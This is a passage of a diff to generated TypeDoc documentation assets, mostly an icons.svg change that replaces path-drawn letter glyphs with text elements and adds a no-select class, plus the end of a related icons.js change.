height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">C</text></g><g id=\"icon-1024\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-property)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">P</text></g><g id=\"icon-2048\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-method)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">M</text></g><g id=\"icon-4096\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-function)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">F</text></g><g id=\"icon-8192\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-property)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">P</text></g><g id=\"icon-16384\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-constructor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">C</text></g><g id=\"icon-32768\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-property)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">P</text></g><g id=\"icon-65536\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">T</text></g><g id=\"icon-131072\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">T</text></g><g id=\"icon-262144\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-accessor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">A</text></g><g id=\"icon-524288\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-accessor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">A</text></g><g id=\"icon-1048576\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-accessor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">A</text></g><g id=\"icon-2097152\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">T</text></g><g id=\"icon-4194304\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-reference)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">R</text></g><g id=\"icon-8388608\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-document)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><g stroke=\"var(--color-icon-text)\" fill=\"none\" stroke-width=\"1.5\"><polygon points=\"6,5 6,19 18,19, 18,10 13,5\"></polygon><line x1=\"9\" y1=\"9\" x2=\"13\" y2=\"9\"></line><line x1=\"9\" y1=\"12\" x2=\"15\" y2=\"12\"></line><line x1=\"9\" y1=\"15\" x2=\"15\" y2=\"15\"></line></g></g><g id=\"icon-folder\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-document)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><g stroke=\"var(--color-icon-text)\" fill=\"none\" stroke-width=\"1.5\"><polygon points=\"5,5 10,5 12,8 19,8 19,18 5,18\"></polygon></g></g><g id=\"icon-chevronDown\" class=\"tsd-no-select\"><path d=\"M4.93896 8.531L12 15.591L19.061 8.531L16.939 6.409L12 11.349L7.06098 6.409L4.93896 8.531Z\" fill=\"var(--color-icon-text)\"></path></g><g id=\"icon-chevronSmall\" class=\"tsd-no-select\"><path d=\"M1.5 5.50969L8 11.6609L14.5 5.50969L12.5466 3.66086L8 7.96494L3.45341 3.66086L1.5 5.50969Z\" fill=\"var(--color-icon-text)\"></path></g><g id=\"icon-checkbox\" class=\"tsd-no-select\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></g><g id=\"icon-menu\" class=\"tsd-no-select\"><rect x=\"1\" y=\"3\" width=\"14\" height=\"2\" fill=\"var(--color-icon-text)\"></rect><rect x=\"1\" y=\"7\" width=\"14\" height=\"2\" fill=\"var(--color-icon-text)\"></rect><rect x=\"1\" y=\"11\" width=\"14\" height=\"2\" fill=\"var(--color-icon-text)\"></rect></g><g id=\"icon-search\" class=\"tsd-no-select\"><path d=\"M15.7824 13.833L12.6666 10.7177C12.5259 10.5771 12.3353 10.499 12.1353 10.499H11.6259C12.4884 9.39596 13.001 8.00859 13.001 6.49937C13.001 2.90909 10.0914 0 6.50048 0C2.90959 0 0 2.90909 0 6.49937C0 10.0896 2.90959 12.9987 6.50048 12.9987C8.00996 12.9987 9.39756 12.4863 10.5008 11.6239V12.1332C10.5008 12.3332 10.5789 12.5238 10.7195 12.6644L13.8354 15.7797C14.1292 16.0734 14.6042 16.0734 14.8948 15.7797L15.7793 14.8954C16.0731 14.6017 16.0731 14.1267 15.7824 13.833ZM6.50048 10.499C4.29094 10.499 2.50018 8.71165 2.50018 6.49937C2.50018 4.29021 4.28781 2.49976 6.50048 2.49976C8.71001 2.49976 10.5008 4.28708 10.5008 6.49937C10.5008 8.70852 8.71314 10.499 6.50048 10.499Z\" fill=\"var(--color-icon-text)\"></path></g><g id=\"icon-anchor\" class=\"tsd-no-select\"><g stroke-width=\"2\" stroke=\"currentColor\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path stroke=\"none\" d=\"M0 0h24v24H0z\" fill=\"none\"></path><path d=\"M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5\"></path><path d=\"M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5\"></path></g></g>`;\n         svg.style.display = \"none\";\n         if (location.protocol === \"file:\") updateUseElements();\n     }\n```\n\nFilename: docs/ts/assets/icons.svg:\n```\n@@ -1 +1 @@\n-<svg xmlns=\"http://www.w3.org/2000/svg\"><g id=\"icon-1\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-module)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.162 16V7.24H10.578L11.514 10.072C11.602 10.328 11.674 10.584 11.73 10.84C11.794 11.088 11.842 11.28 11.874 11.416C11.906 11.28 11.954 11.088 12.018 10.84C12.082 10.584 12.154 10.324 12.234 10.06L13.122 7.24H14.538V16H13.482V12.82C13.482 12.468 13.49 12.068 13.506 11.62C13.53 11.172 13.558 10.716 13.59 10.252C13.622 9.78 13.654 9.332 13.686 8.908C13.726 8.476 13.762 8.1 13.794 7.78L12.366 12.16H11.334L9.894 7.78C9.934 8.092 9.97 8.456 10.002 8.872C10.042 9.28 10.078 9.716 10.11 10.18C10.142 10.636 10.166 11.092 10.182 11.548C10.206 12.004 10.218 12.428 10.218 12.82V16H9.162Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-2\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-module)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.162 16V7.24H10.578L11.514 10.072C11.602 10.328 11.674 10.584 11.73 10.84C11.794 11.088 11.842 11.28 11.874 11.416C11.906 11.28 11.954 11.088 12.018 10.84C12.082 10.584 12.154 10.324 12.234 10.06L13.122 7.24H14.538V16H13.482V12.82C13.482 12.468 13.49 12.068 13.506 11.62C13.53 11.172 13.558 10.716 13.59 10.252C13.622 9.78 13.654 9.332 13.686 8.908C13.726 8.476 13.762 8.1 13.794 7.78L12.366 12.16H11.334L9.894 7.78C9.934 8.092 9.97 8.456 10.002 8.872C10.042 9.28 10.078 9.716 10.11 10.18C10.142 10.636 10.166 11.092 10.182 11.548C10.206 12.004 10.218 12.428 10.218 12.82V16H9.162Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-4\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-namespace)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.33 16V7.24H10.77L13.446 14.74C13.43 14.54 13.41 14.296 13.386 14.008C13.37 13.712 13.354 13.404 13.338 13.084C13.33 12.756 13.326 12.448 13.326 12.16V7.24H14.37V16H12.93L10.266 8.5C10.282 8.692 10.298 8.936 10.314 9.232C10.33 9.52 10.342 9.828 10.35 10.156C10.366 10.476 10.374 10.784 10.374 11.08V16H9.33Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-8\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-enum)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.45 16V7.24H14.49V8.224H10.518V10.936H14.07V11.908H10.518V15.016H14.49V16H9.45Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-16\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF984D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.354 16V7.24H12.174C12.99 7.24 13.638 7.476 14.118 7.948C14.606 8.412 14.85 9.036 14.85 9.82C14.85 10.604 14.606 11.232 14.118 11.704C13.638 12.168 12.99 12.4 12.174 12.4H10.434V16H9.354ZM10.434 11.428H12.174C12.646 11.428 13.022 11.284 13.302 10.996C13.59 10.7 13.734 10.308 13.734 9.82C13.734 9.324 13.59 8.932 13.302 8.644C13.022 8.356 12.646 8.212 12.174 8.212H10.434V11.428Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-32\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-variable)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.106 16L8.85 7.24H9.966L11.454 13.192C11.558 13.608 11.646 13.996 11.718 14.356C11.79 14.708 11.842 14.976 11.874 15.16C11.906 14.976 11.954 14.708 12.018 14.356C12.09 13.996 12.178 13.608 12.282 13.192L13.758 7.24H14.85L12.582 16H11.106Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-64\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-function)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.39 16V7.24H14.55V8.224H10.446V11.128H14.238V12.112H10.47V16H9.39Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-128\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-class)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.898 16.1201C11.098 16.1201 10.466 15.8961 10.002 15.4481C9.53803 15.0001 9.30603 14.3841 9.30603 13.6001V9.64012C9.30603 8.85612 9.53803 8.24012 10.002 7.79212C10.466 7.34412 11.098 7.12012 11.898 7.12012C12.682 7.12012 13.306 7.34812 13.77 7.80412C14.234 8.25212 14.466 8.86412 14.466 9.64012H13.386C13.386 9.14412 13.254 8.76412 12.99 8.50012C12.734 8.22812 12.37 8.09212 11.898 8.09212C11.426 8.09212 11.054 8.22412 10.782 8.48812C10.518 8.75212 10.386 9.13212 10.386 9.62812V13.6001C10.386 14.0961 10.518 14.4801 10.782 14.7521C11.054 15.0161 11.426 15.1481 11.898 15.1481C12.37 15.1481 12.734 15.0161 12.99 14.7521C13.254 14.4801 13.386 14.0961 13.386 13.6001H14.466C14.466 14.3761 14.234 14.9921 13.77 15.4481C13.306 15.8961 12.682 16.1201 11.898 16.1201Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-256\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-interface)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.51 16V15.016H11.298V8.224H9.51V7.24H14.19V8.224H12.402V15.016H14.19V16H9.51Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-512\"><rect fill=\"var(--color-icon-background)\" stroke=\"#4D7FFF\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M11.898 16.1201C11.098 16.1201 10.466 15.8961 10.002 15.4481C9.53803 15.0001 9.30603 14.3841 9.30603 13.6001V9.64012C9.30603 8.85612 9.53803 8.24012 10.002 7.79212C10.466 7.34412 11.098 7.12012 11.898 7.12012C12.682 7.12012 13.306 7.34812 13.77 7.80412C14.234 8.25212 14.466 8.86412 14.466 9.64012H13.386C13.386 9.14412 13.254 8.76412 12.99 8.50012C12.734 8.22812 12.37 8.09212 11.898 8.09212C11.426 8.09212 11.054 8.22412 10.782 8.48812C10.518 8.75212 10.386 9.13212 10.386 9.62812V13.6001C10.386 14.0961 10.518 14.4801 10.782 14.7521C11.054 15.0161 11.426 15.1481 11.898 15.1481C12.37 15.1481 12.734 15.0161 12.99 14.7521C13.254 14.4801 13.386 14.0961 13.386 13.6001H14.466C14.466 14.3761 14.234 14.9921 13.77 15.4481C13.306 15.8961 12.682 16.1201 11.898 16.1201Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-1024\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF984D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.354 16V7.24H12.174C12.99 7.24 13.638 7.476 14.118 7.948C14.606 8.412 14.85 9.036 14.85 9.82C14.85 10.604 14.606 11.232 14.118 11.704C13.638 12.168 12.99 12.4 12.174 12.4H10.434V16H9.354ZM10.434 11.428H12.174C12.646 11.428 13.022 11.284 13.302 10.996C13.59 10.7 13.734 10.308 13.734 9.82C13.734 9.324 13.59 8.932 13.302 8.644C13.022 8.356 12.646 8.212 12.174 8.212H10.434V11.428Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-2048\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4DB8\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.162 16V7.24H10.578L11.514 10.072C11.602 10.328 11.674 10.584 11.73 10.84C11.794 11.088 11.842 11.28 11.874 11.416C11.906 11.28 11.954 11.088 12.018 10.84C12.082 10.584 12.154 10.324 12.234 10.06L13.122 7.24H14.538V16H13.482V12.82C13.482 12.468 13.49 12.068 13.506 11.62C13.53 11.172 13.558 10.716 13.59 10.252C13.622 9.78 13.654 9.332 13.686 8.908C13.726 8.476 13.762 8.1 13.794 7.78L12.366 12.16H11.334L9.894 7.78C9.934 8.092 9.97 8.456 10.002 8.872C10.042 9.28 10.078 9.716 10.11 10.18C10.142 10.636 10.166 11.092 10.182 11.548C10.206 12.004 10.218 12.428 10.218 12.82V16H9.162Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-4096\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-function)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M9.39 16V7.24H14.55V8.224H10.446V11.128H14.238V12.112H10.47V16H9.39Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-8192\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF984D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.354 16V7.24H12.174C12.99 7.24 13.638 7.476 14.118 7.948C14.606 8.412 14.85 9.036 14.85 9.82C14.85 10.604 14.606 11.232 14.118 11.704C13.638 12.168 12.99 12.4 12.174 12.4H10.434V16H9.354ZM10.434 11.428H12.174C12.646 11.428 13.022 11.284 13.302 10.996C13.59 10.7 13.734 10.308 13.734 9.82C13.734 9.324 13.59 8.932 13.302 8.644C13.022 8.356 12.646 8.212 12.174 8.212H10.434V11.428Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-16384\"><rect fill=\"var(--color-icon-background)\" stroke=\"#4D7FFF\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M11.898 16.1201C11.098 16.1201 10.466 15.8961 10.002 15.4481C9.53803 15.0001 9.30603 14.3841 9.30603 13.6001V9.64012C9.30603 8.85612 9.53803 8.24012 10.002 7.79212C10.466 7.34412 11.098 7.12012 11.898 7.12012C12.682 7.12012 13.306 7.34812 13.77 7.80412C14.234 8.25212 14.466 8.86412 14.466 9.64012H13.386C13.386 9.14412 13.254 8.76412 12.99 8.50012C12.734 8.22812 12.37 8.09212 11.898 8.09212C11.426 8.09212 11.054 8.22412 10.782 8.48812C10.518 8.75212 10.386 9.13212 10.386 9.62812V13.6001C10.386 14.0961 10.518 14.4801 10.782 14.7521C11.054 15.0161 11.426 15.1481 11.898 15.1481C12.37 15.1481 12.734 15.0161 12.99 14.7521C13.254 14.4801 13.386 14.0961 13.386 13.6001H14.466C14.466 14.3761 14.234 14.9921 13.77 15.4481C13.306 15.8961 12.682 16.1201 11.898 16.1201Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-32768\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF984D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M9.354 16V7.24H12.174C12.99 7.24 13.638 7.476 14.118 7.948C14.606 8.412 14.85 9.036 14.85 9.82C14.85 10.604 14.606 11.232 14.118 11.704C13.638 12.168 12.99 12.4 12.174 12.4H10.434V16H9.354ZM10.434 11.428H12.174C12.646 11.428 13.022 11.284 13.302 10.996C13.59 10.7 13.734 10.308 13.734 9.82C13.734 9.324 13.59 8.932 13.302 8.644C13.022 8.356 12.646 8.212 12.174 8.212H10.434V11.428Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-65536\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.31 16V8.224H8.91V7.24H14.79V8.224H12.39V16H11.31Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-131072\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.31 16V8.224H8.91V7.24H14.79V8.224H12.39V16H11.31Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-262144\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4D4D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M8.85 16L11.13 7.24H12.582L14.85 16H13.758L13.182 13.672H10.53L9.954 16H8.85ZM10.746 12.76H12.954L12.282 10.06C12.154 9.548 12.054 9.12 11.982 8.776C11.91 8.432 11.866 8.208 11.85 8.104C11.834 8.208 11.79 8.432 11.718 8.776C11.646 9.12 11.546 9.544 11.418 10.048L10.746 12.76Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-524288\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4D4D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M8.85 16L11.13 7.24H12.582L14.85 16H13.758L13.182 13.672H10.53L9.954 16H8.85ZM10.746 12.76H12.954L12.282 10.06C12.154 9.548 12.054 9.12 11.982 8.776C11.91 8.432 11.866 8.208 11.85 8.104C11.834 8.208 11.79 8.432 11.718 8.776C11.646 9.12 11.546 9.544 11.418 10.048L10.746 12.76Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-1048576\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4D4D\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M8.85 16L11.13 7.24H12.582L14.85 16H13.758L13.182 13.672H10.53L9.954 16H8.85ZM10.746 12.76H12.954L12.282 10.06C12.154 9.548 12.054 9.12 11.982 8.776C11.91 8.432 11.866 8.208 11.85 8.104C11.834 8.208 11.79 8.432 11.718 8.776C11.646 9.12 11.546 9.544 11.418 10.048L10.746 12.76Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-2097152\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><path d=\"M11.31 16V8.224H8.91V7.24H14.79V8.224H12.39V16H11.31Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-4194304\"><rect fill=\"var(--color-icon-background)\" stroke=\"#FF4D82\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><path d=\"M10.354 17V8.24H13.066C13.586 8.24 14.042 8.348 14.434 8.564C14.826 8.772 15.13 9.064 15.346 9.44C15.562 9.816 15.67 10.256 15.67 10.76C15.67 11.352 15.514 11.86 15.202 12.284C14.898 12.708 14.482 13 13.954 13.16L15.79 17H14.518L12.838 13.28H11.434V17H10.354ZM11.434 12.308H13.066C13.514 12.308 13.874 12.168 14.146 11.888C14.418 11.6 14.554 11.224 14.554 10.76C14.554 10.288 14.418 9.912 14.146 9.632C13.874 9.352 13.514 9.212 13.066 9.212H11.434V12.308Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-8388608\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-document)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><g stroke=\"var(--color-text)\" fill=\"var(--color-icon-background)\"><polygon points=\"6,5 6,19 18,19, 18,9 15,5\"></polygon><line x1=\"9\" y1=\"9\" x2=\"14\" y2=\"9\"></line><line x1=\"9\" y1=\"12\" x2=\"15\" y2=\"12\"></line><line x1=\"9\" y1=\"15\" x2=\"15\" y2=\"15\"></line></g></g><g id=\"icon-chevronDown\"><path d=\"M4.93896 8.531L12 15.591L19.061 8.531L16.939 6.409L12 11.349L7.06098 6.409L4.93896 8.531Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-chevronSmall\"><path d=\"M1.5 5.50969L8 11.6609L14.5 5.50969L12.5466 3.66086L8 7.96494L3.45341 3.66086L1.5 5.50969Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-checkbox\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></g><g id=\"icon-menu\"><rect x=\"1\" y=\"3\" width=\"14\" height=\"2\" fill=\"var(--color-text)\"></rect><rect x=\"1\" y=\"7\" width=\"14\" height=\"2\" fill=\"var(--color-text)\"></rect><rect x=\"1\" y=\"11\" width=\"14\" height=\"2\" fill=\"var(--color-text)\"></rect></g><g id=\"icon-search\"><path d=\"M15.7824 13.833L12.6666 10.7177C12.5259 10.5771 12.3353 10.499 12.1353 10.499H11.6259C12.4884 9.39596 13.001 8.00859 13.001 6.49937C13.001 2.90909 10.0914 0 6.50048 0C2.90959 0 0 2.90909 0 6.49937C0 10.0896 2.90959 12.9987 6.50048 12.9987C8.00996 12.9987 9.39756 12.4863 10.5008 11.6239V12.1332C10.5008 12.3332 10.5789 12.5238 10.7195 12.6644L13.8354 15.7797C14.1292 16.0734 14.6042 16.0734 14.8948 15.7797L15.7793 14.8954C16.0731 14.6017 16.0731 14.1267 15.7824 13.833ZM6.50048 10.499C4.29094 10.499 2.50018 8.71165 2.50018 6.49937C2.50018 4.29021 4.28781 2.49976 6.50048 2.49976C8.71001 2.49976 10.5008 4.28708 10.5008 6.49937C10.5008 8.70852 8.71314 10.499 6.50048 10.499Z\" fill=\"var(--color-text)\"></path></g><g id=\"icon-anchor\"><g stroke-width=\"2\" stroke=\"currentColor\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path stroke=\"none\" d=\"M0 0h24v24H0z\" fill=\"none\"></path><path d=\"M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5\"></path><path d=\"M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5\"></path></g></g></svg>\n\\ No newline at end of file\n+<svg xmlns=\"http://www.w3.org/2000/svg\"><g id=\"icon-1\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-module)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">M</text></g><g id=\"icon-2\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-module)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">M</text></g><g id=\"icon-4\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-namespace)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">N</text></g><g id=\"icon-8\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-enum)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">E</text></g><g id=\"icon-16\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-property)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">P</text></g><g id=\"icon-32\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-variable)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">V</text></g><g id=\"icon-64\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-function)\" 